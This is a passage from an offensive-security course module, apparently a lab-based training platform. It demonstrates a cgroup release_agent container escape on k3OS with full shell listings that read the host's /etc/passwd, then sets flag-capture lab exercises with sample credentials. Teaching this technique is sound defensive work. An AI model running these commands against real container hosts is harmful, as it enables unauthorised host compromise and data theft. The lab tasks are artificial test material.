Let's try to create a new cgroup namespace by adding the **--cgroup** argument.

```
root@unshare:~# exit
exit

root@victim-k3os:~# unshare --user --map-root-user --mount --cgroup bash

root@victim-k3os:~# PS1="\\u@unshare:\\w\\$ "

root@unshare:~# mount -t cgroup -o rdma cgroup /tmp/cgroupfs
root@unshare:~# 
```

> Listing 76 - Mounting the Cgroup File System

Finally! We do not receive an error. At this point, we have a cgroup file system mounted to a directory where we have read-write permissions.

All that's left is to run our **release_agent** exploit.

We'll create a new cgroup and enable the notification.

```
root@unshare:~# mkdir /tmp/cgroupfs/x

root@unshare:~# echo 1 > /tmp/cgroupfs/x/notify_on_release
```

> Listing 77 - Creating cgroup x and Enabling notification

Next, we'll obtain the host path from **/proc/mounts** and add it to the **release_agent** file. We'll have the **release_agent** run the **cmd** command in the _root_ of the container.

```
root@unshare:~# host_path=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/mounts)

root@unshare:~# echo "$host_path/cmd"
/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/79/fs/cmd

root@unshare:~# echo "$host_path/cmd" > /tmp/cgroupfs/release_agent
```

> Listing 78 - Obtaining Host Path and Setting release_agent

Next, we'll create the **cmd** script. This time, we'll have the script obtain the **/etc/passwd** file from the host and save it to an **output** file in the container.

```
root@unshare:~# echo '#!/bin/sh' > /cmd

root@unshare:~# echo "cat /etc/passwd > $host_path/output" >> /cmd

root@unshare:~# chmod a+x /cmd
```

> Listing 79 - Creating cmd Script in Container Root

Finally, we'll run a short-lived process into the cgroup and check the contents of the **output** directory.

```
root@unshare:~# sh -c "echo \$\$ > /tmp/cgroupfs/x/cgroup.procs"

root@unshare:~# cat /output
root:x:0:0:root:/root:/bin/bash
...
rancher:x:1000:1000:Linux User,,,:/home/rancher:/bin/bash
```

> Listing 80 - Triggering the release_agent and Checking the Output

Excellent! We were able to obtain code execution on the target!

In this section, we used a kernel vulnerability to escape a non-privileged container running in k3OS. It's important to note that in this example, we had access to everything we needed to exploit the kernel. This is not always the case. Some kernel exploits require the root namespaces in order to execute or the ability to run certain syscalls. While exploiting kernel vulnerabilities in a container can become complex, it can also be very worthwhile and lucrative to an attacker.

1

(Linux Kernel Organization, 2022), [https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=24f6008564183aa120d07c03d9289519c2fe02af](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=24f6008564183aa120d07c03d9289519c2fe02af) [↩︎](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/container-escapes-interacting-with-the-host-51510/executing-commands-51564/labs-51511#fnref-local_id_1106-1)

2

(SUSE, 2021), [https://k3os.io/](https://k3os.io/) [↩︎](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/container-escapes-interacting-with-the-host-51510/executing-commands-51564/labs-51511#fnref-local_id_1106-2)

3

(Rancher, 2021), [https://github.com/rancher/k3os/issues/702](https://github.com/rancher/k3os/issues/702) [↩︎](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/container-escapes-interacting-with-the-host-51510/executing-commands-51564/labs-51511#fnref-local_id_1106-3)

4

(Rancher, 2021), [https://github.com/rancher/k3os/commit/739395f1e133a716eb408bce9064c8a70bce9c94](https://github.com/rancher/k3os/commit/739395f1e133a716eb408bce9064c8a70bce9c94) [↩︎](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/container-escapes-interacting-with-the-host-51510/executing-commands-51564/labs-51511#fnref-local_id_1106-4)

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Containers - uevent_helper - Exercise

#### Labs

Use the "aws/container-escapes-k3os" exercise lab to exploit the kernel vulnerability to escape out of the container. Once executing commands on the host, find the flag in **/root/proof.txt**.

Answer

## 7.2.11. Labs

Below is a list of targets which contain various container misconfigurations which can result in code execution on the host. Use the various exploits discussed in this module to exploit the containers.

Each victim shell is available on port 2222 with the username "root" and the password "root". The flag can be found in **/root/proof.txt**.

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

|   |   |   |
|---|---|---|
|Containers - Miscellaneous - 1|||
|Containers - Miscellaneous - 2|||
|Containers - Miscellaneous - 3|||
|Containers - Miscellaneous - 4|||

#### Labs

Using the techniques taught in this Learning Module, escape the container to the host and read the flag found in **/root/proof.txt**. For this exercise, use the "Containers - Miscellaneous - 1" VM. Connect to the victim via ssh on port 2222 with the username root and the password root.

Answer

Using the techniques taught in this Learning Module, escape the container to the host and read the flag found in **/root/proof.txt**. For this exercise, use the "Containers - Miscellaneous - 2" VM. Connect to the victim via ssh on port 2222 with the username root and the password root.

Answer

Using the techniques taught in this Learning Module, escape the container to the host and read the flag found in **/root/proof.txt**. For this exercise, use the "Containers - Miscellaneous - 3" VM. Connect to the victim via ssh on port 2222 with the username root and the password root.

Answer

Using the techniques taught in this Learning Module, escape the container to the host and read the flag found in **/root/proof.txt**. For this exercise, use the "Containers - Miscellaneous - 4" VM. Connect to the victim via ssh on port 2222 with the username root and the password root.

Answer